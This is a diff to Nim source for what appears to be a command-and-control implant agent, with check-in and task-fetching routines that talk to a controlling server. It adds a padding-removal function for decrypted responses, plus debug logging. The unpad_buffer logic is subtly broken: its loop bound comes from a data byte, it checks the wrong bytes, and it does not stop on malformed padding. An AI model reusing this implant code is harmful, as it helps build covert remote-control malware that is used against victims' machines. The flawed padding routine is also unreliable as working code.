@@ -2,7 +2,8 @@ import algorithm
 import asyncdispatch
 import base64
 import json
-from strutils import split
+from strutils import split, strip
+from sequtils import delete
 import ../utils/http
 import ../utils/checkin
 import ../utils/config
@@ -11,6 +12,42 @@ import ../utils/task
 
 var curConfig = createConfig()
 var runningJobs: seq[Job]
+
+
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+  ## Converts a string to the corresponding byte sequence.
+  @(str.toOpenArrayByte(0, str.high))
+
+
+func toString*(bytes: openArray[byte]): string {.inline.} =
+  ## Converts a byte sequence to the corresponding string.
+  let length = bytes.len
+  if length > 0:
+    result = newString(length)
+    copyMem(result.cstring, bytes[0].unsafeAddr, length)
+
+proc unpad_buffer*(data: seq[byte], blockSize: uint): string = 
+  var buffer: seq[byte]
+  if blockSize < 1: 
+    when not defined(release):
+      echo "Block size looks wrong"
+    return toString(buffer)
+
+  if uint(len(data)) mod blockSize != 0:
+    when not defined(release):
+      echo "Data isn't aligned to blockSize"
+    return toString(buffer)
+        
+  let paddingLength = int(data[^1])
+  for i in 0..uint32(data[len(data) - paddingLength]):
+    let el = data[i]
+    if el != byte(paddingLength):
+      when not defined(release):
+        echo "Padding had malformed entries. Have: ",  $(paddingLength),  " expected: ",  $(el)
+      result = toString(buffer)
+
+  let num =  len(data) - paddingLength
+  result = toString(data[0..num-1])
 
 proc error*(message: string, exception: ref Exception) =
     echo message
@@ -32,7 +69,9 @@ proc getTasks* : Future[seq[Task]] {.async.} =
             echo "Payload UUID is not matching up when getting tasks something is wrong..."
         return tasks
     # https://nim-lang.org/docs/system.html#%5E.t%2Cint
-    var resp = parseJson(temp[36 .. ^1])
+    if not defined(release):
+      echo "task ", escapeJson(strip(temp[36 .. ^1]))
+    var resp = parseJson(unpad_buffer(toByteSeq(temp[36 .. ^1]),16))
     for jnode in getElems(resp["tasks"]):
         when not defined(release):
             echo "jnode: ", jnode
@@ -55,9 +94,12 @@ proc checkIn: Future[bool] {.async.} =
         let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
         when not defined(release):
             echo "decoded temp: ", temp
-        var resp = parseJson(temp[36 .. ^1])
+            echo "tempy ", escapeJson(temp[36 .. ^1])
+        var resp = parseJson(unpad_buffer(toByteSeq(temp[36 .. ^1]),16))
         when not defined(release):
             echo "resp from checkin: ", resp
+            echo resp["status"].pretty
+            echo "------------------------"
         if(cmp(resp["status"].getStr(), "success") == 0):
             curConfig.PayloadUUID = resp["id"].getStr()
             when not defined(release):
